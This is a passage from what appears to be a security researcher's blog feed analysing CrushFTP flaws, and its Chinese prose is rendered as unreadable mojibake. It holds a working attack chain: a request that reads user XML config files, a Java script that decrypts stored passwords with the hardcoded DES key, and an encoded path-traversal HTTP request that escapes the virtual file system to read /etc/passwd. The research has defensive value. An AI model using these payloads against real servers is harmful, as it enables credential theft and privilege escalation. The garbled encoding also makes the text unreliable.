·ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå……å½“äº†æœåŠ¡å™¨çš„ä¸€ä¸ªç¼“å­˜åŠŸèƒ½(CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177))ï¼Œå› æ­¤å®ƒçš„åˆ©ç”¨ç›¸å¯¹æ¥è¯´æ›´ä¸ºç„å­¦ï¼Œä¸€åˆ‡çœ‹å‘½ï¼Œåœ¨å®æˆ˜ä¸­æˆ‘ä»¬å¾€å¾€æ›´éœ€è¦ä¸€äº›æ›´ç¨³å®šç›´æ¥çš„æ–¹å¼æ¥è·å–adminè´¦æˆ·çš„å¯†ç ã€‚ ååˆ©ç”¨è·å–ç”¨æˆ·é…ç½®æ–‡ä»¶è·¯å¾„åœ¨ä¹‹å‰æˆ‘æåˆ°è¿‡ï¼Œè¿™ä¸ªç³»ç»Ÿå¯¹äºç”¨æˆ·é…ç½®çš„ä¿å­˜æ˜¯åœ¨XMLæ–‡ä»¶ä¸­åšäº†ä¿å­˜ï¼Œå¦‚ä¸‹æ‰€ç¤º å®ƒçš„ç›¸å¯¹è·¯å¾„åœ¨/users/MainUsersä¸‹ å¦å¤–åœ¨æ¼æ´ä½œè€…çš„åˆ†æå½“ä¸­ï¼Œæåˆ°å¯ä»¥ä½¿ç”¨&#123;working_dir&#125;æ¥è·å–é¡¹ç›®è¿è¡Œçš„ç»å¯¹è·¯å¾„ 123456GET /WebInterface/function/?command=zip&amp;c2f=rsC2&amp;path=&#123;working_dir&#125;&amp;names=/bbb HTTP/1.1Host: 127.0.0.1:8080Cookie: CrushAuth=1714046327401_GY8KgRYG9W7GRoulsigqE3V2eKrsC2; Content-Type: application/x-www-form-urlencoded å› æ­¤ç»“åˆä»¥ä¸Šä¸¤ç‚¹æˆ‘ä»¬å¾ˆå®¹æ˜“èƒ½å¾—åˆ°å…·ä½“çš„ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ path=&lt;INCLUDE&gt;&#123;working_dir&#125;users/MainUsers/username/user.XML&lt;/INCLUDE&gt; å½“ç„¶å…¶å®ä½¿ç”¨ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥path=&lt;INCLUDE&gt;./users/MainUsers/username/user.XML&lt;/INCLUDE&gt; å› æ­¤æˆ‘ä»¬åªéœ€è¦çŸ¥é“adminç”¨æˆ·çš„ç”¨æˆ·åå³å¯å¾—åˆ°ç›¸å¯¹åº”çš„é…ç½®æ–‡ä»¶ åŒæ—¶é€šè¿‡é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯†ç ä¹Ÿæ˜¯è¢«åŠ å¯†å­˜å‚¨åœ¨äº†è¿™ä¸ªæ–‡ä»¶å½“ä¸­ 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;userfile type=&quot;properties&quot;&gt; &lt;real_path_to_user&gt;./users/MainUsers/y4tacker/&lt;/real_path_to_user&gt; &lt;updated_time&gt;1713866209446&lt;/updated_time&gt; &lt;created_time&gt;1713794508983&lt;/created_time&gt; &lt;root_dir&gt;/&lt;/root_dir&gt; &lt;user_name&gt;y4tacker&lt;/user_name&gt; &lt;max_logins&gt;0&lt;/max_logins&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;last_logins&gt;04/25/2024 07:33:47 PM,04/25/2024 11:03:37 AM,04/25/2024 10:11:22 AM,04/25/2024 09:55:49 AM,04/24/2024 12:34:08 AM,04/24/2024 12:26:34 AM,04/23/2024 11:39:33 PM,04/23/2024 11:15:06 PM,04/23/2024 05:57:00 PM,04/23/2024 10:40:08 AM&lt;/last_logins&gt; &lt;updated_by_username&gt;crushadmin&lt;/updated_by_username&gt; &lt;password&gt;71W4Y3ZzpxXfeaU4fehf/w==&lt;/password&gt; &lt;created_by_username&gt;crushadmin&lt;/created_by_username&gt; &lt;userVersion&gt;6&lt;/userVersion&gt; &lt;updated_by_email&gt;&lt;/updated_by_email&gt; &lt;configure_reverse_share_events&gt;true&lt;/configure_reverse_share_events&gt; &lt;username&gt;y4tacker&lt;/username&gt;&lt;/userfile&gt; è¿™æ—¶å€™åˆä¼šé¢ä¸´å¦ä¸€ä¸ªé—®é¢˜ï¼Œå°½ç®¡æˆ‘ä»¬çŸ¥é“å­˜åœ¨ä¸€ä¸ªåä¸ºcrushadminçš„ç®¡ç†å‘˜ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªè´¦å·è¢«åˆ äº†æ”¹æˆäº†å…¶ä»–çš„åå­—æˆ‘ä»¬åˆè¯¥å¦‚ä½•ä¸‹æ‰‹å‘¢? æŸ³æš—èŠ±æ˜åˆä¸€æ‘è§£å†³æ–¹æ³•å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œè¿™ä¸ªç³»ç»Ÿä¼šå°†ç”¨æˆ·çš„ä¿¡æ¯ä¿å­˜åˆ°logs/session_logsæ–‡ä»¶å¤¹ä¸‹ æŸ¥çœ‹ç›®å½•æˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œå‘½åæ–¹å¼ä¹Ÿéå¸¸æœ‰è§„å¾‹24(å¹´)04(æœˆ)25(æ—¥)20(æ—¶) å†å¾€ä¸‹ä¸€çº§ç›®å½•çœ‹ï¼Œå‘½åæ–¹å¼å›ºå®šsession_HTTP_num.log å†æ¥çœ‹çœ‹å…·ä½“å†…å®¹ï¼Œä¸éš¾å‘ç°åœ¨æ—¥å¿—å½“ä¸­ï¼Œè¯¦ç»†è®°å½•äº†æˆ‘ä»¬çš„ç”¨æˆ·åä»¥åŠä¸€äº›æ“ä½œä¿¡æ¯ï¼Œè¿™æ—¶å€™ç”¨æˆ·åçš„é—®é¢˜ä¹Ÿå°±è¿åˆƒè€Œè§£ ç ´è§£åŠ å¯†çš„å¯†ç æˆ‘ä»¬ä»¥y4tackerç”¨æˆ·ä¸ºä¾‹ï¼Œè¿™é‡ŒåŠ å¯†çš„å¯†ç ä¸º71W4Y3ZzpxXfeaU4fehf/w== 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;userfile type=&quot;properties&quot;&gt; &lt;real_path_to_user&gt;./users/MainUsers/y4tacker/&lt;/real_path_to_user&gt; &lt;updated_time&gt;1713866209446&lt;/updated_time&gt; &lt;created_time&gt;1713794508983&lt;/created_time&gt; &lt;root_dir&gt;/&lt;/root_dir&gt; &lt;user_name&gt;y4tacker&lt;/user_name&gt; &lt;max_logins&gt;0&lt;/max_logins&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;last_logins&gt;04/25/2024 07:33:47 PM,04/25/2024 11:03:37 AM,04/25/2024 10:11:22 AM,04/25/2024 09:55:49 AM,04/24/2024 12:34:08 AM,04/24/2024 12:26:34 AM,04/23/2024 11:39:33 PM,04/23/2024 11:15:06 PM,04/23/2024 05:57:00 PM,04/23/2024 10:40:08 AM&lt;/last_logins&gt; &lt;updated_by_username&gt;crushadmin&lt;/updated_by_username&gt; &lt;password&gt;71W4Y3ZzpxXfeaU4fehf/w==&lt;/password&gt; &lt;created_by_username&gt;crushadmin&lt;/created_by_username&gt; &lt;userVersion&gt;6&lt;/userVersion&gt; &lt;updated_by_email&gt;&lt;/updated_by_email&gt; &lt;configure_reverse_share_events&gt;true&lt;/configure_reverse_share_events&gt; &lt;username&gt;y4tacker&lt;/username&gt;&lt;/userfile&gt; æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦å»çœ‹çœ‹ç³»ç»Ÿæ˜¯å¦‚ä½•å¤„ç†è§£å¯†å³å¯ é€šè¿‡æŸ¥çœ‹ç™»å½•æµç¨‹å¯¹è¿™å¨å±å±±ç³»ç»Ÿçš„ä¸æ–­æŸ¥æ‰¾ï¼Œæœ€ç»ˆä¸éš¾å‘ç°å¯¹å¯†ç çš„è§£å¯†å¤„ç†åœ¨crushftp.handlers.Common#decode_pass 123456789101112131415161718192021222324252627282930313233343536373839404142# ä»¥ä¸‹ä»…ä»…åˆ—å‡ºå…³é”®ä»£ç public String decode_pass(String raw) &#123; DesEncrypter crypt = new DesEncrypter(new String(com.crushftp.client.Common.encryption_password), base64Decode); String s = crypt.decrypt(raw); if (s == null) &#123; crypt = new DesEncrypter(new String(com.crushftp.client.Common.encryption_password), false); s = crypt.decrypt(raw); &#125; if (s == null) &#123; s = decode_pass3(raw); &#125; return s;&#125;........DesEncrypter.class........public DesEncrypter(String key, boolean base64) &#123; try &#123; ServerStatus var10005 = ServerStatus.thisObj; key = Common.getHash(key, base64, &quot;SHA&quot;, &quot;&quot;, &quot;&quot;, ServerStatus.BG(&quot;sha3_keccak&quot;)); this.doInit(key); &#125; catch (Exception var4) &#123; &#125;&#125;public void doInit(String key) throws Exception &#123; while((float)key.length() / 8.0F != (float)(key.length() / 8)) &#123; key = key + &quot;Z&quot;; &#125; DESKeySpec desKeySpec = new DESKeySpec(key.getBytes()); SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;DES&quot;); SecretKey secretKey = keyFactory.generateSecret(desKeySpec); this.ecipher = Cipher.getInstance(&quot;DES&quot;); this.dcipher = Cipher.getInstance(&quot;DES&quot;); this.ecipher.init(1, secretKey); this.dcipher.init(2, secretKey);&#125; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªcom.crushftp.client.Common.encryption_passwordä¹Ÿæ˜¯ç¡¬ç¼–ç å­˜å‚¨åœ¨ç¨‹åºå½“ä¸­ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“è®¡ç®—å‡ºè¿™ä¸ªåˆå§‹åŒ–çš„key ç®€å•ç¼–å†™ä¸€ä¸ªè§£å¯†è„šæœ¬ 123456789String key = getHash(&quot;crushftp&quot;, true, &quot;SHA&quot;, &quot;&quot;, &quot;&quot;, false);Cipher dcipher = Cipher.getInstance(&quot;DES&quot;);DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;DES&quot;);SecretKey secretKey = keyFactory.generateSecret(desKeySpec);dcipher.init(2,secretKey);byte[] dec = Base64.decode(&quot;71W4Y3ZzpxXfeaU4fehf/w==&quot;);byte[] utf8 = dcipher.doFinal(dec);System.out.println(new String(utf8)); è¿è¡ŒåæˆåŠŸå¾—åˆ°å¯†ç ä¸ºy4tacker å› æ­¤æˆ‘ä»¬ä¾¿èƒ½é€šè¿‡éå†æ—¥å¿—æå–æ‰€æœ‰çš„ç”¨æˆ·åï¼Œå†è¯»å–è§£å¯†å¯†ç å³å¯è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå¯†ç ç™»å½•","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"}]},{"title":"æµ…æCrushFTPä¹‹VFSé€ƒé€¸","slug":"year/2024/4/æµ…æCrushFTPä¹‹VFSé€ƒé€¸","date":"2024-04-23T14:56:38.000Z","updated":"2024-04-23T16:34:30.000Z","comments":true,"path":"2024/04/23/year/2024/4/æµ…æCrushFTPä¹‹VFSé€ƒé€¸/","link":"","permalink":"https://y4tacker.github.io/2024/04/23/year/2024/4/%E6%B5%85%E6%9E%90CrushFTP%E4%B9%8BVFS%E9%80%83%E9%80%B8/","excerpt":"","text":"æµ…æCrushFTPä¹‹VFSé€ƒé€¸å†™åœ¨å‰é¢æœ¬ç¯‡çš„å†…å®¹å¯èƒ½å¹¶ä¸æ˜¯æœ€æ–°çš„æ¼æ´(æ¯•ç«Ÿæˆ‘ä¹Ÿæ²¡æœ€æ–°ç‰ˆä»£ç )ï¼Œæ˜¯å»å¹´åä¸€æœˆä»½æ›´æ–°çš„æ¼æ´ï¼Œåªæ˜¯å½“æ—¶ç”±äºå„ç§å„æ ·çš„é¡¹ç›®å¯¼è‡´åˆ†æè¢«æç½®äº†è®¸ä¹…ï¼Œå†æ¬¡å…³æ³¨å®ƒåˆ™æ˜¯å› ä¸ºçœ‹åˆ°å‡ºäº†æ–°çš„å®‰å…¨å…¬å‘Šï¼Œåˆæƒ³èµ·æ¥å½“æ—¶å¹¶æœªåˆ†æå®Œå…¨ï¼Œäºæ˜¯æ¥ç€ä¹‹å‰çš„å·¥ä½œç»§ç»­ç ”ç©¶ï¼ˆå½“ç„¶å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºæ²¡æœ‰å„ä¸ªç‰ˆæœ¬çš„ä»£ç æ‰€ä»¥ä¸æƒ³çœ‹æœ€æ–°ç‰ˆçš„æ¼æ´ï¼Œå¦å¤–æ¼æ´çš„æè¿°ä¸­ä¹Ÿå¹¶ä¸èƒ½è®©æˆ‘çœ‹å‡ºä»€ä¹ˆï¼‰ å†æ¬¡å›é¡¾ï¼Œä»æè¿°ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ¼æ´åˆ©ç”¨çš„ä¸€éƒ¨åˆ†æ˜¯çŸ¥é“adminçš„ç”¨æˆ·åï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯ä½¿ç”¨ä½æƒé™è´¦å·(æˆ–è€…ç³»ç»Ÿå¼€å¯äº†åŒ¿åè®¿é—®)é€ƒé€¸åŸæœ¬çš„VFS(è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ)è¯»å–ä»»æ„æ–‡ä»¶ï¼Œæœ€ç»ˆèƒ½åšåˆ°ä¸€ä¸ªææƒçš„æ•ˆæœ è‡³äºä¸ºä»€ä¹ˆï¼Ÿåˆ™æ˜¯å› ä¸ºè¿™ä¸ªç³»ç»Ÿçš„é…ç½®åŒ…æ‹¬ç”¨æˆ·åã€å¯†ç ä»¥åŠä¸€äº›ç¡¬ç¼–ç å¯†é’¥å…¶å®éƒ½æ˜¯é€šè¿‡XMLæ–‡ä»¶çš„å½¢å¼åšä¿å­˜ ç”¨æˆ·ä¿¡æ¯åˆ™æ˜¯ä¿å­˜åœ¨users/MainUsers/xxxç›®å½•ä¸‹ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬èƒ½åšåˆ°ä»»æ„æ–‡ä»¶çš„è¯»å–ï¼Œé‚£ä¹ˆæ¯«æ— ç–‘é—®ï¼Œæˆ‘ä»¬ä¾¿èƒ½è§£å¯†adminç”¨æˆ·çš„ä¿¡æ¯æˆåŠŸå®ç°ææƒ æ¼æ´åˆ†æHTTPçš„åˆ©ç”¨å› ä¸ºè¿™å¥—ç³»ç»Ÿæ”¯æŒå¾ˆå¤šç§è®¿é—®æ–¹å¼ï¼Œå¦‚HTTPã€FTPç­‰ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥HTTPçš„åˆ©ç”¨ä¸ºä¾‹(ä¸»è¦æ˜¯æ›´æœ‰è¶£ä¸€ç‚¹) å…³äºè·¯ç”±ç­‰çš„ä¿¡æ¯å…¶å®æ—©åœ¨ä¸Šä¸€ç¯‡æ–‡ç« å½“ä¸­æˆ‘å°±æ›¾æåˆ° CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177) ä»ä¸Šå›¾å¯ä»¥ç®€å•çœ‹å‡ºï¼Œè¿™é‡Œè‡ªå·±å®ç°äº†åè®®çš„è§£æå¹¶åšè°ƒç”¨ï¼Œå†™æ³•æ¯”è¾ƒæ­»æ¿ï¼Œä¸å¤Ÿçµæ´»ï¼ˆå…·ä½“è¿‡ç¨‹å¯ä»¥åœ¨crushftp.server.ServerSessionHTTPçœ‹åˆ°å…·ä½“çš„å¤„ç†è¿‡ç¨‹)ï¼Œå› æ­¤é‰´äºå®ƒçœ‹ç€å®åœ¨è®©äººå—æŠ˜ç£¨ï¼Œè¿™é‡Œä¹Ÿå¹¶ä¸æ‰“ç®—å¸¦å¤§å®¶ä¸€è¡Œä¸€è¡Œçœ‹ä»£ç ï¼Œæˆ‘ä»¬ä¸»è¦åˆ†äº«ä¸€äº›å…³é”®çš„æœ‰è¶£çš„æ€è·¯ é¦–å…ˆæˆ‘ä»¬å‡è®¾æ‹¥æœ‰ä¸€ä¸ªä½æƒé™çš„è´¦å·(æˆ–è€…æ”¯æŒåŒ¿åè®¿é—®çš„æƒ…å†µä¸‹å°±ä¸éœ€è¦äº†)ï¼Œå¹¶ä¸”æ‹¥æœ‰éƒ¨åˆ†æ–‡ä»¶è¯»å–çš„æƒé™ å¯¹äºæŸä¸ªå…±äº«æ–‡ä»¶çš„è®¿é—®ï¼Œå…¶å®å°±æ˜¯ç›´æ¥é€šè¿‡URL+æ–‡ä»¶çš„å½¢å¼åšè®¿é—® åœ¨è¿™æ—¶å€™æˆ‘ä»¬ç¬¬ä¸€ä¸ªèƒ½æƒ³åˆ°çš„æ€è·¯å°±æ˜¯ä¼šä¸ä¼šå­˜åœ¨ç›´æ¥çš„è·¯å¾„ç©¿è¶Š/Desktop/../../../../../etc/passwdï¼Œå½“ç„¶åœ¨è¿™é‡Œç›´æ¥è¿™æ ·è®¿é—®æ˜¯ä¸è¡Œçš„ï¼Œå…·ä½“å’Œç¨‹åºå¤„ç†é€»è¾‘ç›¸å…³ å¯¹åº”çš„æ–‡ä»¶è®¿é—®åŠŸèƒ½åœ¨ä»£ç å½“ä¸­åˆ™æ˜¯ä»1532è¡Œå¼€å§‹(æˆ‘çš„ç‰ˆæœ¬æ˜¯10.5)ï¼Œæœ‰å…´è¶£è‡ªå·±è¯»ä¸€è¯» å…ˆæ˜¯å¯¹è·¯å¾„é€šè¿‡dotså‡½æ•°åšå¤„ç† 12345678public static String dots(String s) &#123; boolean uncFix = s.indexOf(&quot;:////&quot;) &gt; 0; s = s.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;); for(String s2 = &quot;&quot;; s.indexOf(&quot;%&quot;) &gt;= 0 &amp;&amp; !s.equals(s2); s = s.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;)) &#123; s2 = s; s = url_decode(s); &#125; å¯ä»¥çœ‹åˆ°ä»–å¯¹è·¯å¾„åšäº†ä¸€äº›å¤„ç†ï¼Œå…³äºuncçš„è·¯å¾„å¤„ç†æˆ‘ä»¬è¿™é‡Œä¹Ÿä¸çœ‹äº†æ²¡å¤šå¤§ç”¨é€”ï¼Œå…¶ä½™éƒ¨åˆ†çš„å¤„ç†åˆ™æ˜¯ å¤šæ¬¡å¯¹è·¯å¾„åšurlè§£ç ï¼Œç›´åˆ°å®Œå…¨è§£ç (è§£ç çš„å†…å®¹ç­‰äºè§£ç å‰çš„å†…å®¹åˆ™è®¤ä¸ºä¸éœ€è¦ç»§ç»­è§£ç ) å¦‚æœè·¯å¾„ä»¥../å¼€å¤´åˆ™å»é™¤../çš„éƒ¨åˆ†ï¼Œå¦‚æœè·¯å¾„ä»¥..ç»“å°¾åˆ™å¯¹è·¯å¾„æœ«å°¾è¡¥å……/ å¦‚æœè·¯å¾„ä¸­å­˜åœ¨../æˆ–./åˆ™å¯¹å…¶åšè·¯å¾„å½’ä¸€åŒ–çš„å¤„ç†ï¼Œæœ€åå»é™¤æ”¶å°¾çš„../ä»¥åŠ/. å¦‚æœè·¯å¾„ä¸­å­˜åœ¨!!!ä»¥åŠ(ä¸”è¦æ±‚!!!åœ¨ä¹‹å‰)ï¼Œåœ¨è·¯å¾„ä¸­å­˜åœ¨/æ—¶ï¼ŒæŒ‰/åšåˆ†æ®µå¤„ç†ï¼Œåˆ†åˆ«éå†åˆ é™¤å…¶ä¸­çš„!!!ä»¥åŠ~ è¿”å›å¤„ç†å¥½çš„å­—ç¬¦ä¸² åœ¨è¿™é‡Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ„é€ /.!!!~./etc/passwdæ¥å®ç°å¯¹è·¯å¾„çš„ç©¿è¶Šï¼Œä½†è¦æ˜¯ä»…ä»…å¦‚æ­¤é‚£è¿™ä¸ªæ¼æ´å°±ç¼ºä¹äº†ä¸€äº›è¶£å‘³ æ¥ä¸‹æ¥å¦‚æœä¸æ˜¯ä»¥/WebInterface/functionå¼€å¤´çš„è·¯ç”±åˆ™ä¼šè°ƒç”¨åˆ°cdå‡½æ•°è®¾ç½®å¯¹åº”çš„è·¯å¾„ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œåˆè°ƒç”¨Common.dotsåšäº†ä¸€æ¬¡å¤„ç†ï¼Œåˆ°è¿™é‡Œä¹Ÿå°±æ˜¯ä¸¤æ¬¡äº† 12345Common.dotsCommon.dots(user_dir); this.http_dir = user_dir; this.thisSession.uiPUT(&quot;current_dir&quot;, user_dir);&#125; åˆ«æ€¥è¿˜æ²¡å®Œæœ€ç»ˆåœ¨è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œå®ƒåˆè°ƒç”¨äº†this.fixPath(path);å¯¹è·¯å¾„åšäº†å¤„ç†ï¼Œåˆ°è¿™é‡Œä¹Ÿå°±æ˜¯è¿ç»­ä½¿ç”¨ä¸‰æ¬¡dotså‡½æ•°åšäº†è·¯å¾„å¤„ç†æ“ä½œ 12345678910111213public String fixPath(String path) &#123; path = Common.dots(path); if (path.toUpperCase().startsWith(&quot;FILE:&quot;) || path.indexOf(&quot;:&quot;) == 1 || path.indexOf(&quot;:&quot;) == 2) &#123; path = crushftp.handlers.Common.replace_str(path, &quot;:\\\\&quot;, &quot;/&quot;); path = crushftp.handlers.Common.replace_str(path, &quot;:/&quot;, &quot;/&quot;); &#125; if (path.startsWith(&quot;/&quot;)) &#123; path = path.substring(1); &#125; return path;&#125; å¦‚æœä»…ä»…åªæ˜¯çœ‹ä»£ç è¡¨é¢ï¼Œç¬¬ä¸€çœ¼ä½ å¯èƒ½ä¼šè§‰å¾—å®Œäº†ï¼Œä¼¼ä¹å¹¶ä¸èƒ½ç»•è¿‡ï¼Ÿåœ¨è¿™é‡Œæ¨èå¤§å®¶è‡ªå·±ä»”ç»†æ€è€ƒä¸‹çœ‹çœ‹èƒ½ä¸èƒ½å‘ç°ä¸€äº›ç«¯å€ª ç ´å±€åœ¨è¿™é‡Œæˆ‘å°±ç›´æ¥å…¬å¸ƒç­”æ¡ˆäº†ï¼Œç ´å±€ç‚¹åœ¨è¿™ä¸ªurlè§£ç çš„è¿‡ç¨‹ï¼Œåˆšåˆšè¯´åˆ°äº†ä»–ä¼šå¤šæ¬¡è°ƒç”¨urldecodeè§£ç å­—ç¬¦ä¸²ï¼Œç›´åˆ°è§£ç åçš„å†…å®¹ä¸è§£ç å‰çš„å†…å®¹ä¸€è‡´åˆ™è®¤ä¸ºä¸éœ€è¦ç»§ç»­è§£ç äº† 1234for(String s2 = &quot;&quot;; s.indexOf(&quot;%&quot;) &gt;= 0 &amp;&amp; !s.equals(s2); s = s.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;)) &#123; s2 = s; s = url_decode(s);&#125; è€Œè¿™é‡Œé—®é¢˜çš„å…³é”®åˆ™åœ¨äºè¿™ä¸ªè§£ç å‡½æ•°ï¼Œä»–ç†æ‰€å½“ç„¶çš„è®¤ä¸ºäº†jdkè‡ªå¸¦çš„è§£ç åº“ä¸€å®šä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬èƒ½è®©è§£ç è¿‡ç¨‹æŠ¥é”™ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›è¿™ä¸ªå­—ç¬¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293public static String url_decode(String s) &#123; try &#123; if (s.indexOf(&quot;% &quot;) &lt; 0 &amp;&amp; !s.endsWith(&quot;%&quot;)) &#123; String s2 = s.replace(&#x27;+&#x27;, &#x27;Ã¾&#x27;); s2 = URLDecoder.decode(s2, &quot;UTF8&quot;); s = s2.replace(&#x27;Ã¾&#x27;, &#x27;+&#x27;); &#125; &#125; catch (Exception var2) &#123; log(&quot;SERVER&quot;, 2, (Exception)var2); &#125; for(int x = 0; s != null &amp;&amp; x &lt; 32; ++x) &#123; if (x &lt; 9 || x &gt; 13) &#123; s = s.replace((char)x, &#x27;_&#x27;); &#125; &#125; return s;&#125;public static String decode(String s, Charset charset) &#123; Objects.requireNonNull(charset, &quot;Charset&quot;); boolean needToChange = false; int numChars = s.length(); StringBuilder sb = new StringBuilder(numChars &gt; 500 ? numChars / 2 : numChars); int i = 0; char c; byte[] bytes = null; while (i &lt; numChars) &#123; c = s.charAt(i); switch (c) &#123; case &#x27;+&#x27;: sb.append(&#x27; &#x27;); i++; needToChange = true; break; case &#x27;%&#x27;: /* * Starting with this instance of %, process all * consecutive substrings of the form %xy. Each * substring %xy will yield a byte. Convert all * consecutive bytes obtained this way to whatever * character(s) they represent in the provided * encoding. */ try &#123; // (numChars-i)/3 is an upper bound for the number // of remaining bytes if (bytes == null) bytes = new byte[(numChars-i)/3]; int pos = 0; while ( ((i+2) &lt; numChars) &amp;&amp; (c==&#x27;%&#x27;)) &#123; int v = Integer.parseInt(s, i + 1, i + 3, 16); if (v &lt; 0) throw new IllegalArgumentException( &quot;URLDecoder: Illegal hex characters in escape &quot; + &quot;(%) pattern - negative value&quot;); bytes[pos++] = (byte) v; i+= 3; if (i &lt; numChars) c = s.charAt(i); &#125; // A trailing, incomplete byte encoding such as // &quot;%x&quot; will cause an exception to be thrown if ((i &lt; numChars) &amp;&amp; (c==&#x27;%&#x27;)) throw new IllegalArgumentException( &quot;URLDecoder: Incomplete trailing escape (%) pattern&quot;); sb.append(new String(bytes, 0, pos, charset)); &#125; catch (NumberFormatException e) &#123; throw new IllegalArgumentException( &quot;URLDecoder: Illegal hex characters in escape (%) pattern - &quot; + e.getMessage()); &#125; needToChange = true; break; default: sb.append(c); i++; break; &#125; &#125; return (needToChange? sb.toString() : s);&#125; åœ¨è¿™é‡Œå°±ä¸å¸¦å¤§å®¶ä¸€è¡Œä¸€è¡Œè§£è¯»äº†ï¼Œä¸»è¦æ˜¯å¤ªæ™šäº†è¿˜è¦ç¡è§‰å‘¢ï¼Œè¿™é‡Œç›´æ¥å…¬å¸ƒç­”æ¡ˆï¼Œå¤§å®¶è‡ªå·±ä»”ç»†çœ‹çœ‹ åœ¨è¿™é‡Œæˆ‘ä»¬è®¿é—®(Desktopæ˜¯ä»»æ„å¯è®¿é—®çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶) 1/Desktop/HackedByY4%/!!!~.!!!~./%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 ç¬¬ä¸€æ¬¡è·¯å¾„å¤„ç†: urlè§£ç å‡ºé”™(%/.æ— æ³•è§£ç )ç›´æ¥è¿”å›åŸå­—ç¬¦ï¼Œä¹‹åä¼šåˆ é™¤ï¼ï¼ï¼~ æ­¤æ—¶payloadå˜æˆäº† 1/Desktop/HackedByY4%/../%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 ç¬¬äºŒæ¬¡è·¯å¾„å¤„ç†ï¼š urlè§£ç å‡ºé”™ç›´æ¥è¿”å›åŸå­—ç¬¦ï¼Œä¹‹åé‡åˆ°../åšè·¯å¾„å½’ä¸€åŒ–å æ­¤æ—¶payloadå˜æˆäº† 1/Desktop/%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 ç¬¬ä¸‰æ¬¡è·¯å¾„å¤„ç†: urlæˆåŠŸè§£ç ï¼Œæ­¤æ—¶payloadä¸º 1/Desktop//..!!!~/..!!!~/..!!!~/..!!!~/..!!!~/..!!!~/etc/passwd ä¹‹åä¼šåˆ é™¤ï¼ï¼ï¼~ï¼ŒæˆåŠŸæ¢å¤ä¸ºæˆ‘ä»¬è¦è¯»å–çš„æ–‡ä»¶ï¼Œè¿™é‡Œç”±äº/Desktopæ–‡ä»¶å­˜åœ¨è¯»å–æƒé™ï¼Œå› æ­¤é€šè¿‡ç›®å½•ç©¿è¶Šæˆ‘ä»¬æœ€ç»ˆä¹Ÿå°±å®ç°äº†å¯¹/etc/passwdçš„è¯»å–ï¼Œå®ç°äº†å¯¹VFSçš„é€ƒé€¸ 1/Desktop/../../../../../etc/passwd æµ‹è¯•payload 12345678GET /Desktop/HackedByY4%/!!!~.!!!~./%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0Content-Type: application/x-www-form-urlencodedConnection: closeCookie:csrftoken=4sAZX2pHaNF9RyoEHb7KENFQhia3jntA; currentAuth=BIGS; CrushAuth=1713889594438_uQ1LVPWPBAYQSHLZrtUV4uzR1yBIGSContent-Length: 77 æˆåŠŸå®ç°äº†å¯¹/etc/passwdæ–‡ä»¶çš„è¯»å– 